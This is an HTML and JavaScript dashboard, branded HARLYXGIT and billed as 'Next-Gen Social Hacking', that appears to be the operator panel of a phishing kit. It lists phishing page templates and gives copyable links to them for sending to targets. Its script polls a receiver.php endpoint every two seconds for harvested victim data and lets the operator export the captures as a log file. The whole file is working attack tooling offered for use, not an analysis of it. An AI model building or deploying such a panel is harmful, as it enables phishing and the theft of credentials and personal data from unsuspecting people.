<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HARLYGIT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        .sidebar {
            height: 100vh;
            width: 250px;
            position: fixed;
            top: 0;
            left: -250px;
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            transition: 0.3s ease;
            z-index: 1000;
            overflow-y: auto;
            border-right: 1px solid #fff;
        }

        .sidebar.active {
            left: 0;
        }

        .sidebar a {
            display: block;
            color: #fff;
            padding: 10px;
            text-decoration: none;
            border-radius: 5px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }

        .sidebar a:hover {
            background-color: rgba(255, 255, 255, 0.2);
        }

        .main-content {
            transition: margin-left 0.3s ease;
            padding: 20px;
            margin-left: 250px;
        }

        .main-content.shifted {
            margin-left: 0;
        }

        .glass-container {
            background: rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
            border: 1px solid #fff;
            width: 90%;
            max-width: 800px;
            margin: 20px auto;
        }

        .form-control {
            background-color: #333;
            color: #fff;
            border: 1px solid #fff;
        }

        .form-control:focus {
            background-color: #444;
            color: #fff;
            border-color: #fff;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.25);
        }

        .btn {
            background-color: #000;
            color: #fff;
            border: 1px solid #fff;
        }

        .btn:hover {
            background-color: #fff;
            color: #000;
        }

        #menu-toggle {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1001;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }

        .default-content {
            text-align: center;
            padding: 20px;
        }

        .default-content h1 {
            margin-bottom: 20px;
        }

        .log-controls {
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <button id="menu-toggle">☰</button>
    
    <div class="sidebar">
        <h2>Operations</h2>
        <!-- Links will be dynamically loaded here -->
    </div>

    <div class="main-content">
        <div id="content-area" class="glass-container">
            <div class="default-content">
                <h1>HARLYXGIT</h1>
                <p>Welcome to the HARLYXGIT Next-Gen Social Hacking.</p>
                <p>Select an operation from the sidebar to begin.</p>
                <p><strong>Warning:</strong> Unauthorized access is prohibited. Use at your own risk.</p>
                <p><strong>Developed by:</strong> HARLY</p>
            </div>
        </div>

        <div class="log-controls">
            <div class="mt-2 d-flex justify-content-center">
                <textarea class="form-control w-100 m-3" placeholder="Terminal Output" id="result" rows="15"></textarea>
            </div>

            <div class="mt-2 d-flex justify-content-center">
                <button class="btn m-2" id="btn-listen">Initialize</button>
                <button class="btn m-2" id="btn-download">Export Logs</button>
                <button class="btn m-2" id="btn-clear">Purge</button>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            // Toggle sidebar
            $("#menu-toggle").click(function() {
                $(".sidebar").toggleClass("active");
                $(".main-content").toggleClass("shifted");
            });

            // Load templates into sidebar
            $.post("list_templates.php", function(data) {
                var templates = JSON.parse(data);
                var sidebarLinks = '';

                templates.forEach(template => {
                    sidebarLinks += `
                        <a href="#" onclick="loadTemplate('${template}'); return false;">${template}</a>
                    `;
                });

                $(".sidebar").append(sidebarLinks);
            });

            window.loadTemplate = function(template) {
                var imageUrl = `${template}.png`;
                var path = `http://${location.host}/templates/${template}/index.html`;

                var content = `
                    <div class="template-item">
                        <div class="template-image">
                            <img src="${imageUrl}" alt="Template Image" style="width: 200px; height: auto; border-radius: 8px;">
                        </div>
                        <div class="template-info">
                            <p class="template-path">${path}</p>
                            <button class="btn btn-copy" data-path="${path}">Copy</button>
                        </div>
                    </div>
                `;

                $("#content-area").html(content);
                $(".sidebar").removeClass("active");
                $(".main-content").removeClass("shifted");
            }

            // Handle Copy Button Click
            $("#content-area").on('click', '.btn-copy', function() {
                var path = $(this).data('path');
                navigator.clipboard.writeText(path).then(() => {
                    alert('The link was copied: ' + path);
                });
            });

            // Clear Logs Button Click
            $("#btn-clear").on('click', function() {
                $("#result").val('');
            });

            // Download Logs Button Click
            $("#btn-download").on('click', function() {
                var text = $("#result").val();
                var filename = 'log.txt';
                saveTextAsFile(text, filename);
            });

            function saveTextAsFile(text, filename) {
                var blob = new Blob([text], { type: 'text/plain' });
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }

            // Listener function and other JS functions
            var old_data = '';

            function Listener() {
                $.post("receiver.php", {"send_me_result": ""}, function(data) {
                    if (data != "") {
                        old_data += data + "\n-------------------------\n";
                        $("#result").val(old_data);
                    }
                });
            }

            var timer = setInterval(Listener, 2000);

            $("#btn-listen").click(function() {
                if ($("#btn-listen").text() == "Stop") {
                    clearInterval(timer);
                    $("#btn-listen").text("Initialize");
                } else {
                    timer = setInterval(Listener, 2000);
                    $("#btn-listen").text("Stop");
                }
            });
        });
    </script>
</body>
</html>
